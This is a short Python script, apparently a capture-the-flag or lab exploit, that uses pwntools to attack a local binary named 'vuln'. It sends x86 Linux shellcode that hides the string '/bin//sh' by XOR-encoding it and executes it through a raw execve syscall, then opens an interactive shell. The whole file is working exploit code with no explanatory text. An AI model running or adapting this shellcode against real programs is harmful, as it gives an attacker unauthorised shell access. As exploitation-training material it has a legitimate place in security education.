from pwn import *

p = process('./vuln')
shell_code = asm(shellcraft.i386.linux.sh())

shell_code = asm('''
    xor eax, eax
    push eax
    push 0x79623e3e
    xor dword ptr[esp], 0x11111111
    push 0x7f78733e
    xor dword ptr[esp], 0x11111111
    mov ebx, esp
    mov edx, eax
    mov ecx, eax
    mov eax, 0x0b
    int 0x80
''')

print(p.recvline())
p.sendline(shell_code)
p.interactive()
